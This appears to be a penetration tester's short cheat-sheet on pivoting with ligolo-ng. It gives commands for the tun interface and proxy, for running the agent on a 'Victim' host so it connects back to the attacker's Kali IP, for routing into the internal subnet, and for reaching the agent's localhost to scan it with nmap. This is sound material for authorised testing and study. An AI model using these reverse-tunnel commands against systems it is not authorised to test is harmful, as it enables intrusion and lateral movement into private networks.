# ligolo-ng
https://medium.com/@redfanatic7/guide-to-pivoting-using-ligolo-ng-efd36b290f16
Access localhost addresses of host https://docs.ligolo.ng/Localhost/ (use address 240.0.0.1/32)

## Prerequisites
Listo of agents and proxy binaries
```bash
sudo apt install ligolo-ng  
/usr/share/ligolo-ng
```
```bash
sudo ip tuntap add user kali mode tun ligolo
```
```bash
sudo ip link set ligolo up
```
## Use
1. Kali
    ```bash
    ./proxy -selfcert -laddr 0.0.0.0:443
    ```
1. Victim 
    ```bash
    .\ligolo-agent -ignore-cert -retry -connect <Kali_IP>:443 
    ```
    ```bash
    .\agent.exe -ignore-cert -retry -connect 192.168.49.91:443 
    ```
2. Kali
    ```bash
    ligolo-ng>> session # select session
    ligolo-ng>> start
    ```
    ```bash
    sudo ip route add 10.10.194.0/24 dev ligolo
    ```
# Access to agent's local ports (127.0.0.1)
https://docs.ligolo.ng/Localhost/
there's a "magic" CIDR hardcoded in Ligolo-ng: _240.0.0.0/4_ (This is an unused IPv4 subnet)
```bash
$ sudo ip route add 240.0.0.1/32 dev ligolo
$ nmap 240.0.0.1 -sV
```
# Caveats

Because the _agent_ is running without privileges, it's not possible to forward raw packets. When you perform a NMAP SYN-SCAN, a TCP connect() is performed on the agent.

When using _nmap_, you should use `--unprivileged` or `-PE` to avoid false positives.
```bash
nmap -PE ...
```